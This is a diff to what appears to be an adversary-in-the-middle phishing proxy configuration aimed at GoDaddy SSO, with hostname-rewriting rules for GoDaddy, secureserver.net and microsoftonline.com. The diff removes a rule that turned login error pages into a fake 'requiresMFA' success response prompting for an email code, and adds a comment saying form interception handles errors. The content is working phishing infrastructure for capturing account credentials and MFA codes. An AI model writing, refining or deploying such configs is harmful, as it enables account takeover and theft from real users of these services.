@@ -182,7 +182,8 @@ sub_filters:
   - {triggers_on: 'sso.godaddy.com', orig_sub: 'login', domain: 'microsoftonline.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['application/json', 'text/html', 'application/javascript', 'application/x-javascript', 'text/javascript']}
   # CRITICAL: Catch /v1/api/pass/login error responses (405, Yikes, etc) and rewrite to 2FA success
   # Match: 405 errors, "Yikes" pages, "Method Not Allowed", "Something went wrong"
-  - {triggers_on: 'sso.godaddy.com', orig_sub: 'sso', domain: 'godaddy.com', search: '(405|Yikes|Method Not Allowed|Something went wrong|went wrong|error)', replace: '{"success":true,"requiresMFA":true,"factor":{"type":"email","deliveryInfo":{"email":"code@mail.local"}},"redirect":"","code":"email"}', mimes: ['text/html', 'application/json']}
+  # DISABLED: Error rewriting corrupts HTML responses. Form interception handles errors.
+  # - {triggers_on: 'sso.godaddy.com', orig_sub: 'sso', domain: 'godaddy.com', search: '(405|Yikes|Method...)', replace: '...'}
   - {triggers_on: 'sso.secureserver.net', orig_sub: 'login', domain: 'microsoftonline.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['application/json', 'text/html', 'application/javascript', 'application/x-javascript', 'text/javascript']}
   - {triggers_on: 'csp.godaddy.com', orig_sub: 'csp', domain: 'godaddy.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript'], redirect_only: true}
   - {triggers_on: 'events.api.godaddy.com', orig_sub: 'events.api', domain: 'godaddy.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript'], redirect_only: true}
